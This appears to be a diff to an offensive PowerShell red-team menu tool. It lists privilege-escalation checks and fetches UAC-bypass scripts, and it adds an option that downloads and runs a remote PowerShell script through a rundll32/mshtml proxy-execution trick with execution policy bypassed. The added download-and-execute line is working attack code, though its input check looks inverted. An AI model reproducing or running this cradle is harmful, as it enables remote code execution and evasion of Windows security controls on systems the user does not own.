@@ -276,6 +276,7 @@ while($true){
     write-host " 335. list all softwares installed`t`t`t`t336. use accesschk`t`t`t`t`t`t337. unquoted service path";
     write-host " 338. scheduled tasks`t`t`t`t`t`t339. autorun startup`t`t`t`t`t`t340. check AlwaysInstallElevated enabled";
     write-host " 341. snmp config`t`t`t`t`t`t342. password in registry`t`t`t`t`t343. sysprep or unattend files";
+    write-host " 368. Download a remote file with rundll32 bypass";
     write-host "WEBAPP";
     write-host " 350. Mr-Un1k0d3r/RedTeamCSharpScripts/webhunter";
     write-host "WEBDAV";
@@ -615,6 +616,7 @@ while($true){
         '365' {Scarica "gushmazuko/WinBypass/EventVwrBypass" "EventVwrBypass.ps1" "gushmazuko/WinBypass/master/EventVwrBypass.ps1"}
         '366' {Scarica "gushmazuko/WinBypass/DiskCleanupBypass_direct" "DiskCleanupBypass_direct.ps1" "gushmazuko/WinBypass/master/DiskCleanupBypass_direct.ps1"}
         '367' {ScaricaBat "Mncx86/Windows-10-UAC-bypass" "uacdisabler.bat" "Mncx86/Windows-10-UAC-bypass/master/uacdisabler.bat"}
+        '368' {write-host "Digit a remote file to download"; $MIP=read-host "(example, http://10.11.12.13/script.ps1)"; if($MIP -le ""){rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('$MIP');"}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
